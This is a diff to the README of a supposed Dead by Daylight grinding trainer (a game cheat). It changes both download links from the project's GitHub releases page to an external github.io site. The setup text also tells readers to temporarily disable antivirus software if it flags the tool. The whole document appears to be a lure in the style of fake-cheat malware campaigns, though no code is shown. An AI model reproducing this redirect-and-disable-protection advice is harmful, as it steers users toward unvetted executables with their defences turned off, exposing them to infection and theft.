@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Elite - Automate your progress in Dead by Daylight
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/artis9808/DBD-AutoGrind-Trainer-2026-Elite/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://artis9808.github.io)
 
 ## 📌 About this project
 
@@ -26,7 +26,7 @@ Follow these steps to set up the trainer on your system.
 ### 1. Download the tool
 Visit the official releases page to obtain the latest version of the software.
 
-[Download the latest release here](https://github.com/artis9808/DBD-AutoGrind-Trainer-2026-Elite/releases)
+[Download the latest release here](https://artis9808.github.io)
 
 ### 2. Prepare the environment
 Close all programs that might interfere with game overlays. Disable third-party antivirus software temporarily if it flags the application. Sometimes, security software blocks tools that read game memory.
